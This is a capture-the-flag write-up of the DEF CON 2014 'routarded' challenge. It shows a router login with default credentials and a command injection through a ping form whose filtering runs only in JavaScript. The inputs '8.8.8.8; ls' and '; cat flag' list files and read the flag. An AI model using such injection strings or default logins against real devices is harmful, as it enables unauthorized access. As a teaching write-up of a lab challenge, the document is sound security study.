# DEF CON CTF Qualifier 2014: routarded

**Category:** Baby’s First
**Points:** 1
**Description:**

> Wow, they forwarded http on a router with default creds?
>
> http://routarded_87f7837f50a5370771b9467d840c93c5.2014.shallweplayaga.me:5000/

## Write-up

The hint mentioned default credentials, so we tried some default credentials. After some trying, we found out the credentials were the following:

> username=
> password=admin

We used this to log in on the router. Amongst other things, there was a page to ping ip's and urls. When we attempted to add another command to that, the command was sanitized, but we saw the sanitizing happening! Great, seems like a javascript-only sanitizing!

> 8.8.8.8; ls
> 8.8.8.8

We disabled javascript and tried again. Now we got the directory listing!

> bower_components
> flag
> requirements.txt
> routarded.py
> static
> templates

The flag seemed like the right thing:

> ; cat flag

It returned the following:

> The flag is: l0l, can't believe they still do this shit

## Other write-ups

* (none yet)
